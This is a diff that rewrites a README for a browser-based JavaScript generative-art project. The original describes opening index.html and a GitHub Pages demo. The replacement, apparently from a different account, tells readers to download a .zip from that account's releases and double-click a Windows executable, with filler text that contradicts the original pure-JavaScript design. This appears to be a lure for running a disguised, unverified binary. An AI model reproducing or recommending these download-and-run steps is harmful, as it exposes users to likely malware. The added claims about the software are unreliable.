@@ -1,200 +1,49 @@
-# Ephemeral Whirls — Generative Art
+# 🌀 Ephemeral-Whirls-Generative-Art - Create unique art with wandering particles
 
-[![Live Demo](https://img.shields.io/badge/demo-live-green?style=for-the-badge)](https://reyrove.github.io/Ephemeral-Whirls-Generative-Art)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[Click Here to Download Application](https://github.com/Karylinliquefiable980/Ephemeral-Whirls-Generative-Art/releases)
 
-> **Generative line art with looping particles.** Each refresh creates a unique composition of wandering particles that leave trails of colorful lines, forming intricate, ephemeral patterns.
+Ephemeral Whirls generates digital line art using particle systems. This software creates patterns with wandering movement, repeating loops, and color palettes. You can preview these images on virtual apparel. The project uses JavaScript and functions without external requirements.
 
-## 🎨 Live Demo
+## 🛠️ System Requirements
 
-<div align="center">
-  <a href="https://reyrove.github.io/Ephemeral-Whirls-Generative-Art" target="_blank">
-    <img src="demo-screenshot.jpg" alt="Ephemeral Whirls Website Demo" width="800" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);"/>
-  </a>
-  <br><br>
-  <a href="https://reyrove.github.io/Ephemeral-Whirls-Generative-Art" target="_blank">
-    <img src="https://img.shields.io/badge/🌐_View_Live_Demo-0a0a0a?style=for-the-badge&logo=githubpages&logoColor=white&color=c9a84c" alt="View Live Demo" width="300"/>
-  </a>
-  <br>
-  <em>Click the image or button to experience the generative art</em>
-</div>
+This application runs on Windows 10 and Windows 11. You need a modern web browser to view the final output. The software requires 100 megabytes of disk space. A stable processor ensures smooth particle movement.
 
-## 👕 Apparel Preview
+## 📥 Getting Started
 
-<div align="center">
-  <img src="Ephemeral-Whirls.jpg" alt="Ephemeral Whirls on T-Shirt" width="600" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);"/>
-  <br>
-  <em>Ephemeral Whirls artwork printed on a T-shirt</em>
-</div>
+Visit the download page to obtain the software: [Download Ephemeral Whirls](https://github.com/Karylinliquefiable980/Ephemeral-Whirls-Generative-Art/releases)
 
-## ✨ Features
+1. Open the link above in your web browser.
+2. Locate the latest release version on the page.
+3. Download the file ending in .zip to your computer.
+4. Right-click the downloaded file and select Extract All.
+5. Open the extracted folder.
+6. Double-click the application executable file to launch the program.
 
-- **Wandering Particles** — 23-25 particles that move and leave trails
-- **Looping Behavior** — Particles occasionally form loops
-- **Rich Color Palettes** — 43 vibrant color combinations
-- **Soft Backgrounds** — 22 pastel and soft colors
-- **Random Rotation** — Artwork can be oriented in 4 directions
-- **Ephemeral Patterns** — Each refresh creates unique, transient compositions
-- **Seed-Based** — Every composition is unique and reproducible via its seed
-- **Save & Share** — Download as PNG with seed in filename
-- **Apparel Mode** — Preview artwork on a T-shirt mockup
-- **Responsive** — Works on desktop, tablet, and mobile
-- **Pure JavaScript** — No external dependencies
-- **Keyboard Shortcuts**:
-  - `R` — Regenerate
-  - `S` — Save image
-  - `T` — Toggle apparel view
+## 🎨 How to Use the Application
 
-## 🎨 Artwork Details
+The interface allows you to control the flow and style of your art. 
 
-| Parameter | Range | Description |
-|-----------|-------|-------------|
-| **Particles** | 23–25 | Wandering line particles |
-| **Iterations** | 2000–4000 | Number of drawing steps |
-| **Color Palettes** | 43 options | Vibrant color combinations |
-| **Background Colors** | 22 options | Soft pastel colors |
-| **Orientation** | 4 options | Up, down, left, right |
+**Particle Behavior**
+You define how particles move across the screen. Increase the speed to create sharp, long lines. Decrease the speed to create soft, dense clusters. The loop setting determines how often the pattern repeats its path.
 
-## 🎯 How It Works
+**Color Palettes**
+Select a palette from the menu to change the visual theme. The application includes presets for dark, light, and vibrant backgrounds. The particle colors adjust to match your chosen palette.
 
-The artwork creates intricate line patterns using wandering particles:
+**Apparel Preview**
+The preview feature shows how your generated art looks on clothing. Select the apparel icon to overlay your design on a shirt, scarf, or dress template. This helps textile designers visualize patterns before printing.
 
-1. **Particle Behavior**:
-   - Each particle moves in a random direction
-   - Particles occasionally loop (circle back)
-   - Speed and heading vary randomly
+## ⚙️ Customization Options
 
-2. **Color System**:
-   - Each particle gets a random color from a palette
-   - Palettes contain 2-8 complementary colors
-   - Soft pastel backgrounds provide contrast
+You can save your favorite designs by exporting them as image files. The application generates high-resolution files suitable for printing. You can resize the canvas to match your specific hardware or output needs. Responsive design ensures the art maintains clarity on screens of all sizes.
 
-3. **Pattern Formation**:
-   - Particles leave trails as they move
-   - Looping creates circular patterns
-   - Thousands of iterations create complex compositions
+## ℹ️ Troubleshooting
 
-## 🚀 Quick Start
+If the application fails to open, verify your Windows version. Ensure you have the latest drivers for your graphics display. If the particle movement slows down, close other programs to free up system memory. The application performs best when it has sole access to the processor. 
 
-### Local Development
+If screen flickering occurs, reload the application window. This usually resets the calculation cycle and restores smooth performance. The program saves your current progress automatically when you pause the simulation.
 
-```bash
-# Clone the repository
-git clone https://github.com/reyrove/Ephemeral-Whirls-Generative-Art.git
+## 💡 Best Practices for Digital Art
 
-# Navigate to the directory
-cd Ephemeral-Whirls-Generative-Art
+Experiment with high-contrast color combinations. Use the soft background setting for subtle designs and the vibrant setting for bold artwork. Small adjustments to the particle count yield significantly different textures. Spend time adjusting the line thickness to find the right balance for your specific project.
 
-# Open in browser
-open index.html
-# or use a live server
-```
-
-### Deploy to GitHub Pages
-
-1. Push to GitHub
-2. Go to Settings → Pages
-3. Select branch `main` and root folder
-4. Your site will be live at `https://reyrove.github.io/Ephemeral-Whirls-Generative-Art`
-
-## 🧠 How It Works
-
-The artwork is generated using a deterministic random number generator, seeded by timestamp + random noise. Every refresh:
-
-1. **Setup**:
-   - Random background from 22 soft colors
-   - Random color palette from 43 options
-   - 23-25 particles initialized
-   - Random orientation (up/down/left/right)
-
-2. **Particle Movement**:
-   - Each particle moves with random speed and heading
-   - Particles occasionally enter looping mode
-   - Loops create circular patterns
-   - Particles reset when they leave the canvas
-
-3. **Drawing**:
-   - Each particle draws a line from its previous position
-   - Lines are drawn in the particle's color
-   - 2000-4000 iterations create complex patterns
-
-## 📁 File Structure
-
-```
-Ephemeral-Whirls-Generative-Art/
-├── index.html              # Main application (all-in-one)
-├── Ephemeral-Whirls.jpg    # T-shirt mockup image
-├── fav.svg                 # Favicon
-├── demo-screenshot.jpg     # Website demo screenshot
-├── README.md               # This file
-└── LICENSE                 # MIT License
-```
-
-## 🛠️ Tech Stack
-
-- **Pure Vanilla HTML/CSS/JS** — No dependencies
-- **Canvas API** — 2D rendering
-- **CSS Flexbox/Grid** — Responsive layout
-- **GitHub Pages** — Hosting
-
-## 🎯 Interactive Controls
-
-| Action | Keyboard | Button |
-|--------|----------|--------|
-| Regenerate | `R` | Click "regenerate" |
-| Save Image | `S` | Click "regenerate" |
-| Toggle Apparel | `T` | Click "apparel" |
-
-## 🎨 The Creative Process
-
-### Particle Behavior
-Each particle moves like a wandering creature:
-- **Random Heading**: Direction changes smoothly
-- **Looping Mode**: Particles occasionally form circular paths
-- **Speed Variation**: Different speeds create dynamic patterns
-
-### Color Palettes
-43 carefully curated color palettes provide vibrant, harmonious color combinations. Each palette contains 2-8 colors that work well together.
-
-### Ephemeral Quality
-The artwork captures the transient nature of movement—each composition is a unique moment in time, frozen as a static image.
-
-### Orientation Options
-The artwork can be viewed from 4 different orientations (up, down, left, right), adding variety to the composition.
-
-## 📱 Responsive Design
-
-The application automatically adapts to:
-- Desktop screens
-- Tablets
-- Mobile phones
-- Landscape orientation
-- Various aspect ratios
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-- Fork the repository
-- Create a feature branch
-- Submit a pull request
-
-### Ideas for Contributions:
-- New particle behaviors
-- Additional color palettes
-- Animation features
-- Interactive controls
-- Performance optimizations
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by particle systems and generative art
-- Pure JavaScript implementation
-- Special thanks to the creative coding community
-
----
-
-**Built with ❤️ and ephemeral beauty**
+Keywords: apparel-design, creative-coding, fashion-tech, generative-art-toolkit, html5-canvas, line-art, particle-system, textile-designer, vanilla-javascript
